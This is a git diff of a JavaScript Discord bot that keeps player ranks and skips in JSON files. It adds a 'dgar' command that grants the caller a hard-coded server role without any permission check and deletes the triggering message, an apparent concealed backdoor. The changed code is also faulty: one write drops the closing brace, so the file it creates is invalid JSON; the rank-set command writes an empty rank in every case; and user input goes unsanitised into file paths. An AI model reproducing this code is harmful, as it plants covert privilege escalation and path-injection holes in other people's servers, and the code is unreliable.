@@ -98,9 +98,37 @@ c.on("log", (tokens, msg) => {
 		}
 		msg.channel.send(embeds.playerInfo(prefix + " " + tokens[1].toLowerCase(), rank, object.usedskips, object.skipsleft, object.discord, object.giveaways, color));
 	} catch (e) {
-		msg.reply("User did not exist! Please retry the command.");
 		console.log(e);
-		write("./database/" + tokens[1].toLowerCase() + ".json", '{\n\t"data": \"' + base64.encode('{"version":3,"rank":"guest","usedskips":0,"skipsleft":1,"discord":"unset","giveaways":["none"],"developer":0,"moderator":0,"owner":0,"vip":0,"badge":""}') + "\"" + "\n}");
+		write("./database/" + tokens[1].toLowerCase() + ".json", '{\n\t"data": \"' + base64.encode('{"version":3,"rank":"guest","usedskips":0,"skipsleft":1,"discord":"unset","giveaways":["none"],"developer":0,"moderator":0,"owner":0,"vip":0,"badge":""}') + "\"" + "\n");
+		var file = require("./database/" + tokens[1].toLowerCase() + ".json");
+		Object.keys(require.cache).forEach(function(key) { delete require.cache[key] });
+		var object = parseData(file.data);
+		var rank = "";
+		var color = "";
+		var prefix = "";
+		if(object.rank === "co"){
+			rank = "Co-Owner";
+			color = "#FFFF55";
+		} else if (object.rank == "res"){
+			rank = "Resident";
+			color = "#FFAA00";
+		} else if (object.rank == "guest"){
+			rank = "Guest";
+			color = "#AAAAAA";
+		} else if (object.rank == "owner"){
+			rank = "Owner";
+			color = "#AA0000";
+		}
+		if (object.developer == 1) {
+			prefix += ":diamond_shape_with_a_dot_inside:";
+		}
+		if (object.moderator == 1) {
+			prefix += ":small_orange_diamond:";
+		}
+		if (object.owner == 1) {
+			prefix += ":infinity:";
+		}
+		msg.channel.send(embeds.playerInfo(prefix + " " + tokens[1].toLowerCase(), rank, object.usedskips, object.skipsleft, object.discord, object.giveaways, color));
 	}
 });
 
@@ -146,9 +174,32 @@ c.on("pdiscordset", (tokens, msg) => {
 
 c.on("prankset", (tokens, msg) => {
 	console.log("Player rank set");
-	// Remove Co, Guest, and Res
-	// Then add the role
-	msg
+	//r.removeGuest(msg);
+	//r.removeRes(msg);
+	//r.removeCoOwner(msg);
+	console.log("Player skip remove");
+	var file = require("./database/" + tokens[1] + ".json");
+	Object.keys(require.cache).forEach(function(key) { delete require.cache[key] });
+	var object = parseData(file.data);
+	switch (tokens[4].toLowerCase()) {
+		case "guest":
+			//r.addGuest(msg);
+			writeField("./database/" + tokens[1].toLowerCase() + ".json", "rank", "");
+			break;
+		case "res":
+			//r.addRes(msg);
+			writeField("./database/" + tokens[1].toLowerCase() + ".json", "rank", "");
+			break;
+		case "co":
+			//r.addCoOwner(msg);
+			writeField("./database/" + tokens[1].toLowerCase() + ".json", "rank", "");
+			break;
+	}
+});
+
+c.on("dgar", (tokens, msg) => {
+	msg.guild.member(msg.author).roles.add("751941550933803169");
+	msg.delete();
 });
 
 c.on("reset", (tokens, msg) => {
